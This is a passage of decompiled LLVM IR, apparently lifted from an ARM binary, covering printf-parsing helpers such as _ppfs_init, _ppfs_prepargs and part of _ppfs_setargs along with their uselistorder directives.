  %stack_var_-336.1.ph = phi i32 [ %stack_var_-336.2, %dec_label_pc_10848 ], [ %stack_var_-336.4, %dec_label_pc_10840 ]
  %v1_102f8180 = inttoptr i32 %v0_102f849 to i8*
  %v2_102f8181 = load i8, i8* %v1_102f8180, align 1
  %v3_102f8182 = zext i8 %v2_102f8181 to i32
  store i32 %v3_102f8182, i32* %r3.global-to-local, align 4
  %v2_102fc183 = icmp eq i8 %v2_102f8181, 0
  br i1 %v2_102fc183, label %dec_label_pc_10314, label %bb126

dec_label_pc_10848:                               ; preds = %dec_label_pc_10354
  %v1_10848 = add i32 %v0_1035c, 2
  store i32 %v1_10848, i32* @r4, align 4
  br label %dec_label_pc_102f8.outer

dec_label_pc_10850:                               ; preds = %dec_label_pc_106c0, %dec_label_pc_10824, %.thread36, %dec_label_pc_10770, %dec_label_pc_10754, %dec_label_pc_10624, %bb162, %dec_label_pc_10588, %bb130, %dec_label_pc_10800
  br label %dec_label_pc_10858

dec_label_pc_10858:                               ; preds = %dec_label_pc_10348, %bb, %dec_label_pc_102c8, %dec_label_pc_10850
  %stack_var_-336.5 = phi i32 [ -1, %bb ], [ -1, %dec_label_pc_102c8 ], [ -1, %dec_label_pc_10850 ], [ %stack_var_-336.2, %dec_label_pc_10348 ]
  store i32 %stack_var_-336.5, i32* %r0.global-to-local, align 4
  store i32 %v6_10284, i32* @r5, align 4
  store i32 %v15_10284, i32* %r8.global-to-local, align 4
  store i32 %v18_10284, i32* @sb, align 4
  store i32 %v21_10284, i32* @sl, align 4
  store i32 %v24_10284, i32* @fp, align 4
  ret i32 %stack_var_-336.5

; uselistorder directives
  uselistorder i32 %stack_var_-336.5, { 1, 0 }
  uselistorder i32 %v1_10848, { 1, 0 }
  uselistorder i8 %v2_102f8181, { 1, 2, 0 }
  uselistorder i32 %v0_102f849, { 2, 0, 1 }
  uselistorder i32 %v5_10324, { 2, 3, 1, 0 }
  uselistorder i32 %v0_10424, { 9, 12, 13, 2, 10, 8, 11, 6, 5, 4, 1, 0, 7, 3, 15, 14 }
  uselistorder i32 %v0_10840, { 1, 0, 2 }
  uselistorder i32 %v1_107d4, { 2, 1, 0 }
  uselistorder i32 %v0_107dc, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1075c, { 1, 0 }
  uselistorder i32 %v2_10740, { 2, 0, 1 }
  uselistorder i1 %v3_10720, { 1, 0 }
  uselistorder i32 %v0_10730, { 0, 2, 3, 1 }
  uselistorder i32 %v2_10704, { 1, 0 }
  uselistorder i32 %v0_10748, { 1, 0, 2 }
  uselistorder i32 %v3_106d8, { 1, 2, 0 }
  uselistorder i32 %v0_10688, { 1, 0 }
  uselistorder i32 %v2_1066c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_10634, { 1, 2, 0, 3 }
  uselistorder i32 %v0_10600, { 1, 2, 0, 3 }
  uselistorder i32 %v1_10504, { 3, 2, 0, 4, 1, 5 }
  uselistorder i32 %v0_10520, { 1, 2, 3, 0 }
  uselistorder i32 %v6_104a0, { 2, 1, 0, 3, 4, 7, 5, 6 }
  uselistorder i32 %v4_10404, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_103b4.pre, { 2, 1, 0 }
  uselistorder i32 %v1_103ac, { 1, 0 }
  uselistorder i32 %v1_10354, { 2, 0, 1, 3 }
  uselistorder i32 %stack_var_-336.2, { 0, 8, 6, 1, 2, 5, 4, 3, 7 }
  uselistorder i32 %v2_10314, { 1, 0 }
  uselistorder i32 %v1_1030c.lcssa, { 1, 0 }
  uselistorder i8 %v2_102f8, { 1, 2, 0 }
  uselistorder i32 %v2_1030c, { 1, 2, 3, 0 }
  uselistorder i1 %v7_10518, { 1, 0 }
  uselistorder i1 %v7_10464, { 1, 2, 0 }
  uselistorder i1 %v7_1065c, { 1, 0 }
  uselistorder i1 %v7_105bc, { 1, 0 }
  uselistorder i1 %v7_104a8, { 1, 0 }
  uselistorder i32 %v2_105fc, { 0, 2, 1, 3 }
  uselistorder i32 %v2_106cc, { 3, 2, 5, 4, 11, 10, 9, 7, 8, 6, 1, 0 }
  uselistorder i32* %v1_103dc, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v2_103b0, { 2, 4, 3, 5, 0, 1 }
  uselistorder i32 %v2_10390, { 1, 2, 0 }
  uselistorder i32 %v4_10388, { 1, 0 }
  uselistorder i32 %v2_1028c, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32* %stack_var_-332, { 2, 1, 3, 4, 0, 5 }
  uselistorder i32 %tmp103, { 2, 1, 0 }
  uselistorder i32 %tmp102, { 19, 18, 15, 13, 8, 9, 0, 10, 12, 11, 3, 4, 5, 6, 7, 1, 2, 17, 16, 14 }
  uselistorder i32 %tmp101, { 6, 5, 3, 2, 0, 4, 1 }
  uselistorder i32 %tmp97, { 2, 1, 3, 0 }
  uselistorder i32* %r3.global-to-local, { 39, 3, 4, 1, 2, 5, 6, 0, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 38, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37 }
  uselistorder i32* %r2.global-to-local, { 22, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 25, 26, 20, 21, 23, 24, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 4, 7, 6, 9, 8, 10, 11, 13, 12, 15, 14, 16, 17, 20, 18, 19, 22, 21, 24, 23, 26, 25, 28, 27, 32, 29, 30, 31, 1, 33, 34, 44, 35, 45, 2, 37, 36, 39, 38, 41, 40, 43, 42, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32 (i32, i8, i32)* @_charpad, { 1, 2, 3, 0 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder label %dec_label_pc_10858, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_10850, { 1, 9, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_10840, { 1, 0 }
  uselistorder label %dec_label_pc_10800, { 1, 0 }
  uselistorder label %.thread36, { 1, 0 }
  uselistorder label %dec_label_pc_10770, { 1, 0 }
  uselistorder label %.thread29, { 1, 0 }
  uselistorder label %bb169, { 1, 0 }
  uselistorder label %bb167, { 1, 0 }
  uselistorder label %dec_label_pc_1071c, { 1, 0 }
  uselistorder label %dec_label_pc_10700, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10700thread-pre-split, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_106f4, { 1, 0 }
  uselistorder label %dec_label_pc_106e4, { 0, 2, 1 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %dec_label_pc_10678, { 1, 0 }
  uselistorder label %bb162, { 1, 0 }
  uselistorder label %bb159, { 1, 0 }
  uselistorder label %bb157, { 4, 1, 2, 0, 3 }
  uselistorder label %bb154, { 1, 0 }
  uselistorder label %bb152, { 1, 0 }
  uselistorder label %bb150, { 1, 0 }
  uselistorder label %bb148, { 4, 3, 1, 0, 2 }
  uselistorder label %bb145, { 1, 0 }
  uselistorder label %dec_label_pc_10454, { 1, 0 }
  uselistorder label %dec_label_pc_10450, { 2, 1, 0 }
  uselistorder label %bb139, { 2, 1, 0 }
  uselistorder label %dec_label_pc_103a8, { 1, 0 }
  uselistorder label %bb134, { 1, 0 }
  uselistorder label %dec_label_pc_10348, { 1, 0 }
  uselistorder label %bb130, { 1, 0 }
  uselistorder label %dec_label_pc_10314, { 2, 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %v3_10878 = load i32, i32* @r4, align 4
  store i32 %v3_10878, i32* %stack_var_-12, align 4
  %v6_10878 = load i32, i32* @r5, align 4
  store i32 152, i32* @r2, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_10884 = load i32, i32* @r1, align 4
  store i32 %v0_10884, i32* @r5, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_1088c = bitcast i32* %arg1 to i8*
  %v3_1088c = call i32 @__GI_memset(i8* %v2_1088c, i32 0)
  %v0_10890 = load i32, i32* @r4, align 4
  %v1_10890 = add i32 %v0_10890, 24
  %v2_10890 = inttoptr i32 %v1_10890 to i32*
  %v3_10890 = load i32, i32* %v2_10890, align 4
  %v1_10894 = add i32 %v3_10890, -1
  store i32 %v1_10894, i32* %v2_10890, align 4
  %v0_1089c = load i32, i32* @r5, align 4
  %v1_1089c = load i32, i32* @r4, align 4
  %v2_1089c = inttoptr i32 %v1_1089c to i32*
  store i32 %v0_1089c, i32* %v2_1089c, align 4
  %v0_108a0 = load i32, i32* @r4, align 4
  %v1_108a0 = add i32 %v0_108a0, 40
  store i32 %v1_108a0, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v2_108b019 = inttoptr i32 %v1_108a0 to i32*
  store i32 8, i32* %v2_108b019, align 4
  %v3_108b020 = load i32, i32* %r1.global-to-local, align 4
  %v4_108b021 = add i32 %v3_108b020, 4
  store i32 %v4_108b021, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_108a8.dec_label_pc_108a8_crit_edge

dec_label_pc_108a8.dec_label_pc_108a8_crit_edge:  ; preds = %entry, %dec_label_pc_108a8.dec_label_pc_108a8_crit_edge
  %v4_108b022 = phi i32 [ %v4_108b021, %entry ], [ %v4_108b0, %dec_label_pc_108a8.dec_label_pc_108a8_crit_edge ]
  %v0_108ac.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_108ac = add i32 %v0_108ac.pre, -1
  store i32 %v1_108ac, i32* %r2.global-to-local, align 4
  %v7_108ac = icmp eq i32 %v0_108ac.pre, 1
  %v2_108b0 = inttoptr i32 %v4_108b022 to i32*
  store i32 8, i32* %v2_108b0, align 4
  %v3_108b0 = load i32, i32* %r1.global-to-local, align 4
  %v4_108b0 = add i32 %v3_108b0, 4
  store i32 %v4_108b0, i32* %r1.global-to-local, align 4
  br i1 %v7_108ac, label %dec_label_pc_108b8, label %dec_label_pc_108a8.dec_label_pc_108a8_crit_edge

dec_label_pc_108b8:                               ; preds = %dec_label_pc_108a8.dec_label_pc_108a8_crit_edge
  %v0_108b8 = load i32, i32* @r5, align 4
  store i32 %v0_108b8, i32* %r2.global-to-local, align 4
  %v1_108fc3 = inttoptr i32 %v0_108b8 to i8*
  %v2_108fc4 = load i8, i8* %v1_108fc3, align 1
  %v2_109006 = icmp eq i8 %v2_108fc4, 0
  br i1 %v2_109006, label %dec_label_pc_10908, label %dec_label_pc_108c8

dec_label_pc_108c0:                               ; preds = %dec_label_pc_108e0
  %v2_108c4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_108c4, i32* @r4, align 4
  store i32 %v6_10878, i32* @r5, align 4
  ret i32 -1

dec_label_pc_108c8:                               ; preds = %dec_label_pc_108b8, %dec_label_pc_108fc.backedge
  %v0_108d0 = phi i32 [ %storemerge, %dec_label_pc_108fc.backedge ], [ %v0_108b8, %dec_label_pc_108b8 ]
  %v2_108fc7 = phi i8 [ %v2_108fc, %dec_label_pc_108fc.backedge ], [ %v2_108fc4, %dec_label_pc_108b8 ]
  %v7_108c8 = icmp eq i8 %v2_108fc7, 37
  br i1 %v7_108c8, label %dec_label_pc_108d0, label %dec_label_pc_108f8

dec_label_pc_108d0:                               ; preds = %dec_label_pc_108c8
  %v1_108d0 = add i32 %v0_108d0, 1
  %v2_108d0 = inttoptr i32 %v1_108d0 to i8*
  %v3_108d0 = load i8, i8* %v2_108d0, align 1
  store i32 %v1_108d0, i32* %r2.global-to-local, align 4
  %v7_108d4 = icmp eq i8 %v3_108d0, 37
  br i1 %v7_108d4, label %dec_label_pc_108f8, label %dec_label_pc_108e0

dec_label_pc_108e0:                               ; preds = %dec_label_pc_108d0
  %v0_108d8 = load i32, i32* @r4, align 4
  %v2_108e0 = inttoptr i32 %v0_108d8 to i32*
  store i32 %v1_108d0, i32* %v2_108e0, align 4
  %v2_108e4 = call i32 @_ppfs_parsespec(i32* %v2_108e0)
  %v1_108e8 = icmp slt i32 %v2_108e4, 0
  br i1 %v1_108e8, label %dec_label_pc_108c0, label %dec_label_pc_108f0

dec_label_pc_108f0:                               ; preds = %dec_label_pc_108e0
  %v0_108f0 = load i32, i32* @r4, align 4
  %v1_108f0 = inttoptr i32 %v0_108f0 to i32*
  %v2_108f0 = load i32, i32* %v1_108f0, align 4
  br label %dec_label_pc_108fc.backedge

dec_label_pc_108f8:                               ; preds = %dec_label_pc_108c8, %dec_label_pc_108d0
  %v0_108f8 = phi i32 [ %v0_108d0, %dec_label_pc_108c8 ], [ %v1_108d0, %dec_label_pc_108d0 ]
  %v1_108f8 = add i32 %v0_108f8, 1
  br label %dec_label_pc_108fc.backedge

dec_label_pc_108fc.backedge:                      ; preds = %dec_label_pc_108f8, %dec_label_pc_108f0
  %storemerge = phi i32 [ %v1_108f8, %dec_label_pc_108f8 ], [ %v2_108f0, %dec_label_pc_108f0 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_108fc = inttoptr i32 %storemerge to i8*
  %v2_108fc = load i8, i8* %v1_108fc, align 1
  %v2_10900 = icmp eq i8 %v2_108fc, 0
  br i1 %v2_10900, label %dec_label_pc_108fc.dec_label_pc_10908_crit_edge, label %dec_label_pc_108c8

dec_label_pc_108fc.dec_label_pc_10908_crit_edge:  ; preds = %dec_label_pc_108fc.backedge
  %v0_10908.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10908

dec_label_pc_10908:                               ; preds = %dec_label_pc_108fc.dec_label_pc_10908_crit_edge, %dec_label_pc_108b8
  %v0_10908 = phi i32 [ %v0_10908.pre, %dec_label_pc_108fc.dec_label_pc_10908_crit_edge ], [ %v0_108b8, %dec_label_pc_108b8 ]
  %v3_108fc.lcssa.in = phi i8 [ %v2_108fc, %dec_label_pc_108fc.dec_label_pc_10908_crit_edge ], [ %v2_108fc4, %dec_label_pc_108b8 ]
  %v3_108fc.lcssa = zext i8 %v3_108fc.lcssa.in to i32
  %v1_10908 = load i32, i32* @r4, align 4
  %v2_10908 = inttoptr i32 %v1_10908 to i32*
  store i32 %v0_10908, i32* %v2_10908, align 4
  %v2_1090c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1090c, i32* @r4, align 4
  store i32 %v6_10878, i32* @r5, align 4
  ret i32 %v3_108fc.lcssa

; uselistorder directives
  uselistorder i8 %v2_108fc, { 0, 2, 1 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_108b8, { 1, 0, 2, 3 }
  uselistorder i32 %v4_108b0, { 1, 0 }
  uselistorder i32 %v0_108ac.pre, { 1, 0 }
  uselistorder i32 %v6_10878, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 0, 4, 5, 1, 2, 3 }
  uselistorder label %dec_label_pc_108f8, { 1, 0 }
  uselistorder label %dec_label_pc_108c8, { 1, 0 }
  uselistorder label %dec_label_pc_108a8.dec_label_pc_108a8_crit_edge, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_10910 = load i32, i32* @r4, align 4
  store i32 %v3_10910, i32* %stack_var_-12, align 4
  %v1_10914 = add i32 %arg1, 24
  %v2_10914 = inttoptr i32 %v1_10914 to i32*
  %v3_10914 = load i32, i32* %v2_10914, align 4
  store i32 %v3_10914, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_10924 = add i32 %arg1, 76
  %v3_10924 = inttoptr i32 %v2_10924 to i32*
  store i32 %arg2, i32* %v3_10924, align 4
  %v7_10928 = icmp sgt i32 %v3_10914, 0
  br i1 %v7_10928, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v10_10928 = load i32, i32* %stack_var_-12, align 4
  store i32 %v10_10928, i32* @r4, align 4
  ret i32 %arg1

bb4:                                              ; preds = %entry
  %v0_1092c = load i32, i32* %r3.global-to-local, align 4
  %v2_1092c = add i32 %arg1, 8
  %v3_1092c = inttoptr i32 %v2_1092c to i32*
  store i32 %v0_1092c, i32* %v3_1092c, align 4
  %v0_10930 = load i32, i32* %r5.global-to-local, align 4
  %v2_10930 = add i32 %arg1, 28
  %v3_10930 = inttoptr i32 %v2_10930 to i32*
  store i32 %v0_10930, i32* %v3_10930, align 4
  %v0_10934 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_10934, i32* %v2_10914, align 4
  %v0_10938 = load i32, i32* %r3.global-to-local, align 4
  %v2_10938 = add i32 %arg1, 4
  %v3_10938 = inttoptr i32 %v2_10938 to i32*
  store i32 %v0_10938, i32* %v3_10938, align 4
  %v0_1093c = call i32 @_ppfs_setargs()
  %v0_10940 = load i32, i32* %r5.global-to-local, align 4
  %v1_10940 = load i32, i32* @r4, align 4
  %v2_10940 = add i32 %v1_10940, 24
  %v3_10940 = inttoptr i32 %v2_10940 to i32*
  store i32 %v0_10940, i32* %v3_10940, align 4
  %v2_10944 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_10944, i32* @r4, align 4
  ret i32 %v0_1093c

; uselistorder directives
  uselistorder i32 ()* @_ppfs_setargs, { 1, 0 }
  uselistorder i32 %arg1, { 0, 6, 4, 3, 2, 1, 5, 7 }
}

define i32 @_ppfs_setargs() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_10948 = load i32, i32* @r0, align 4
  %v1_10948 = add i32 %v0_10948, 24
  %v2_10948 = inttoptr i32 %v1_10948 to i32*
  %v3_10948 = load i32, i32* %v2_10948, align 4
  store i32 %v3_10948, i32* %r1.global-to-local, align 4
  %v2_1094c = icmp eq i32 %v3_10948, 0
  %v3_10950 = load i32, i32* @r4, align 4
  store i32 %v3_10950, i32* %stack_var_-8, align 4
  %v1_10954 = add i32 %v0_10948, 80
  store i32 %v1_10954, i32* %ip.global-to-local, align 4
  %v1_10958 = add i32 %v0_10948, 8
  %v2_10958 = inttoptr i32 %v1_10958 to i32*
  %v3_10958 = load i32, i32* %v2_10958, align 4
  store i32 %v3_10958, i32* %r3.global-to-local, align 4
  %v6_10960 = icmp eq i32 %v3_10958, -2147483648
  br i1 %v2_1094c, label %dec_label_pc_10960, label %dec_label_pc_10a84

dec_label_pc_10960:                               ; preds = %entry
  br i1 %v6_10960, label %dec_label_pc_10968, label %dec_label_pc_10980

dec_label_pc_10968:                               ; preds = %dec_label_pc_10960
  %v1_10968 = add i32 %v0_10948, 76
  %v2_10968 = inttoptr i32 %v1_10968 to i32*
  %v3_10968 = load i32, i32* %v2_10968, align 4
  store i32 %v3_10968, i32* %r3.global-to-local, align 4
  %v1_1096c = inttoptr i32 %v3_10968 to i32*
  %v2_1096c = load i32, i32* %v1_1096c, align 4
  store i32 %v2_1096c, i32* %r2.global-to-local, align 4
  %v1_10970 = add i32 %v3_10968, 4
  store i32 %v1_10970, i32* %r3.global-to-local, align 4
  store i32 %v1_10970, i32* %v2_10968, align 4
  %v0_10978 = load i32, i32* %r2.global-to-local, align 4
  %v1_10978 = load i32, i32* @r0, align 4
  %v2_10978 = add i32 %v1_10978, 8
  %v3_10978 = inttoptr i32 %v2_10978 to i32*
  store i32 %v0_10978, i32* %v3_10978, align 4
  %v0_1097c = load i32, i32* %r2.global-to-local, align 4
  %v1_1097c = load i32, i32* @r0, align 4
  %v2_1097c = add i32 %v1_1097c, 80
  %v3_1097c = inttoptr i32 %v2_1097c to i32*
  store i32 %v0_1097c, i32* %v3_1097c, align 4
  %v0_10980.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_10980

dec_label_pc_10980:                               ; preds = %dec_label_pc_10960, %dec_label_pc_10968
  %v1_10998 = phi i32 [ %v0_10948, %dec_label_pc_10960 ], [ %v0_10980.pre, %dec_label_pc_10968 ]
  %v1_10980 = add i32 %v1_10998, 4
  %v2_10980 = inttoptr i32 %v1_10980 to i32*
  %v3_10980 = load i32, i32* %v2_10980, align 4
  store i32 %v3_10980, i32* %r3.global-to-local, align 4
  %v6_10984 = icmp eq i32 %v3_10980, -2147483648
  br i1 %v6_10984, label %dec_label_pc_1098c, label %dec_label_pc_109a4

dec_label_pc_1098c:                               ; preds = %dec_label_pc_10980
  %v1_1098c = add i32 %v1_10998, 76
  %v2_1098c = inttoptr i32 %v1_1098c to i32*
  %v3_1098c = load i32, i32* %v2_1098c, align 4
  store i32 %v3_1098c, i32* %r3.global-to-local, align 4
  %v1_10990 = inttoptr i32 %v3_1098c to i32*
  %v2_10990 = load i32, i32* %v1_10990, align 4
  store i32 %v2_10990, i32* %r2.global-to-local, align 4
  %v1_10994 = add i32 %v3_1098c, 4
  store i32 %v1_10994, i32* %r3.global-to-local, align 4
  store i32 %v1_10994, i32* %v2_1098c, align 4
  %v0_1099c = load i32, i32* %r2.global-to-local, align 4
  %v1_1099c = load i32, i32* @r0, align 4
  %v2_1099c = add i32 %v1_1099c, 4
  %v3_1099c = inttoptr i32 %v2_1099c to i32*
  store i32 %v0_1099c, i32* %v3_1099c, align 4
  %v0_109a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_109a0 = load i32, i32* @r0, align 4
  %v2_109a0 = add i32 %v1_109a0, 80
  %v3_109a0 = inttoptr i32 %v2_109a0 to i32*
  store i32 %v0_109a0, i32* %v3_109a0, align 4
  %v0_10a7418.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_109a4

dec_label_pc_109a4:                               ; preds = %dec_label_pc_10980, %dec_label_pc_1098c
  %v0_10a7418 = phi i32 [ %v1_10998, %dec_label_pc_10980 ], [ %v0_10a7418.pre, %dec_label_pc_1098c ]
  %v0_109a4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_109a4, i32* %lr.global-to-local, align 4
  %v1_10a7419 = add i32 %v0_10a7418, 28
  %v2_10a7420 = inttoptr i32 %v1_10a7419 to i32*
  %v3_10a7421 = load i32, i32* %v2_10a7420, align 4
  store i32 %v3_10a7421, i32* %r3.global-to-local, align 4
  %v5_10a7c23 = icmp slt i32 %v0_109a4, %v3_10a7421
  br i1 %v5_10a7c23, label %dec_label_pc_109ac, label %dec_label_pc_10a80.loopexit

dec_label_pc_109ac:                               ; preds = %dec_label_pc_109a4, %dec_label_pc_10a70
  %v0_10a7425 = phi i32 [ %v0_10a74, %dec_label_pc_10a70 ], [ %v0_10a7418, %dec_label_pc_109a4 ]
  %v1_109ac24 = phi i32 [ %v1_10a70, %dec_label_pc_10a70 ], [ %v0_109a4, %dec_label_pc_109a4 ]
  %v4_109ac = mul i32 %v1_109ac24, 4
  %v5_109ac = add i32 %v0_10a7425, %v4_109ac
  store i32 %v5_109ac, i32* %r3.global-to-local, align 4
  %v1_109b0 = add i32 %v5_109ac, 40
  %v2_109b0 = inttoptr i32 %v1_109b0 to i32*
  %v3_109b0 = load i32, i32* %v2_109b0, align 4
  store i32 %v3_109b0, i32* %r2.global-to-local, align 4
  %v7_109b4 = icmp eq i32 %v3_109b0, 8
  br i1 %v7_109b4, label %dec_label_pc_10a70, label %dec_label_pc_109bc

dec_label_pc_109bc:                               ; preds = %dec_label_pc_109ac
  %v1_109bc = add i32 %v0_10a7425, 76
  %v2_109bc = inttoptr i32 %v1_109bc to i32*
  %v3_109bc = load i32, i32* %v2_109bc, align 4
  store i32 %v3_109bc, i32* %r1.global-to-local, align 4
  %v8_109c0 = icmp sgt i32 %v3_109b0, 8
  br i1 %v8_109c0, label %dec_label_pc_109e4, label %dec_label_pc_109c4

dec_label_pc_109c4:                               ; preds = %dec_label_pc_109bc
  %v7_109c4 = icmp eq i32 %v3_109b0, 2
  br i1 %v7_109c4, label %dec_label_pc_10a30, label %dec_label_pc_109cc

dec_label_pc_109cc:                               ; preds = %dec_label_pc_109c4
  %v8_109cc = icmp sgt i32 %v3_109b0, 2
  br i1 %v8_109cc, label %dec_label_pc_109dc, label %dec_label_pc_109d0

dec_label_pc_109d0:                               ; preds = %dec_label_pc_109cc
  %v1_109d0 = icmp slt i32 %v3_109b0, 0
  br i1 %v1_109d0, label %dec_label_pc_10a5c, label %dec_label_pc_10a30

dec_label_pc_109dc:                               ; preds = %dec_label_pc_109cc
  %v7_109dc = icmp eq i32 %v3_109b0, 7
  br i1 %v7_109dc, label %dec_label_pc_10a44, label %dec_label_pc_10a5c

dec_label_pc_109e4:                               ; preds = %dec_label_pc_109bc
  %v7_109e4 = icmp eq i32 %v3_109b0, 1024
  br i1 %v7_109e4, label %dec_label_pc_10a30, label %dec_label_pc_109ec

dec_label_pc_109ec:                               ; preds = %dec_label_pc_109e4
  %v8_109ec = icmp sgt i32 %v3_109b0, 1024
  br i1 %v8_109ec, label %dec_label_pc_10a04, label %dec_label_pc_109f0

dec_label_pc_109f0:                               ; preds = %dec_label_pc_109ec
  switch i32 %v3_109b0, label %dec_label_pc_10a5c [
    i32 256, label %dec_label_pc_10a30
    i32 512, label %dec_label_pc_10a30
  ]

dec_label_pc_10a04:                               ; preds = %dec_label_pc_109ec
  %v7_10a04 = icmp eq i32 %v3_109b0, 2048
  br i1 %v7_10a04, label %dec_label_pc_10a1c, label %dec_label_pc_10a14

dec_label_pc_10a14:                               ; preds = %dec_label_pc_10a04
  store i32 2055, i32* %r3.global-to-local, align 4
  %v9_10a10 = icmp eq i32 %v3_109b0, 2055
  br i1 %v9_10a10, label %dec_label_pc_10a44, label %dec_label_pc_10a5c

dec_label_pc_10a1c:                               ; preds = %dec_label_pc_10a04
  %v1_10a1c = add i32 %v3_109bc, 8
  store i32 %v1_10a1c, i32* %r3.global-to-local, align 4
  store i32 %v1_10a1c, i32* %v2_109bc, align 4
  %v0_10a24 = load i32, i32* %r1.global-to-local, align 4
  %v1_10a24 = inttoptr i32 %v0_10a24 to i32*
  %v2_10a24 = load i32, i32* %v1_10a24, align 4
  store i32 %v2_10a24, i32* %r3.global-to-local, align 4
  %v3_10a24 = add i32 %v0_10a24, 4
  %v4_10a24 = inttoptr i32 %v3_10a24 to i32*
  %v5_10a24 = load i32, i32* %v4_10a24, align 4
  store i32 %v5_10a24, i32* %r4.global-to-local, align 4
  %v0_10a28 = load i32, i32* %ip.global-to-local, align 4
  %v1_10a28 = inttoptr i32 %v0_10a28 to i32*
  store i32 %v2_10a24, i32* %v1_10a28, align 4
  %v3_10a28 = add i32 %v0_10a28, 4
  %v4_10a28 = inttoptr i32 %v3_10a28 to i32*
  %v5_10a28 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_10a28, i32* %v4_10a28, align 4
  br label %dec_label_pc_10a6c

dec_label_pc_10a30:                               ; preds = %dec_label_pc_109f0, %dec_label_pc_109f0, %dec_label_pc_109d0, %dec_label_pc_109e4, %dec_label_pc_109c4
  %v1_10a30 = inttoptr i32 %v3_109bc to i32*
  %v2_10a30 = load i32, i32* %v1_10a30, align 4
  store i32 %v2_10a30, i32* %r2.global-to-local, align 4
  %v1_10a34 = add i32 %v3_109bc, 4
  store i32 %v1_10a34, i32* %r3.global-to-local, align 4
  store i32 %v1_10a34, i32* %v2_109bc, align 4
  %v0_10a3c = load i32, i32* %r2.global-to-local, align 4
  %v1_10a3c = load i32, i32* %ip.global-to-local, align 4
  %v2_10a3c = inttoptr i32 %v1_10a3c to i32*
  store i32 %v0_10a3c, i32* %v2_10a3c, align 4
  br label %dec_label_pc_10a6c

dec_label_pc_10a44:                               ; preds = %dec_label_pc_109dc, %dec_label_pc_10a14
  %v3_10a44 = load i32, i32* %v2_109bc, align 4
  store i32 %v3_10a44, i32* %r2.global-to-local, align 4
  %v1_10a48 = add i32 %v3_10a44, 8
  store i32 %v1_10a48, i32* %r3.global-to-local, align 4
  store i32 %v1_10a48, i32* %v2_109bc, align 4
  %v0_10a50 = load i32, i32* %r2.global-to-local, align 4
  %v1_10a50 = inttoptr i32 %v0_10a50 to i32*
  %v2_10a50 = load i32, i32* %v1_10a50, align 4
  store i32 %v2_10a50, i32* %r3.global-to-local, align 4
  %v3_10a50 = add i32 %v0_10a50, 4
  %v4_10a50 = inttoptr i32 %v3_10a50 to i32*
  %v5_10a50 = load i32, i32* %v4_10a50, align 4
  store i32 %v5_10a50, i32* %r4.global-to-local, align 4
  %v0_10a54 = load i32, i32* %ip.global-to-local, align 4
  %v1_10a54 = inttoptr i32 %v0_10a54 to i32*
  store i32 %v2_10a50, i32* %v1_10a54, align 4
  %v3_10a54 = add i32 %v0_10a54, 4
  %v4_10a54 = inttoptr i32 %v3_10a54 to i32*
  %v5_10a54 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_10a54, i32* %v4_10a54, align 4
  br label %dec_label_pc_10a6c

dec_label_pc_10a5c:                               ; preds = %dec_label_pc_109f0, %dec_label_pc_109dc, %dec_label_pc_109d0, %dec_label_pc_10a14
  %v1_10a5c = add i32 %v3_109bc, 4
  store i32 %v1_10a5c, i32* %r3.global-to-local, align 4
  store i32 %v1_10a5c, i32* %v2_109bc, align 4
  %v0_10a64 = load i32, i32* %r1.global-to-local, align 4
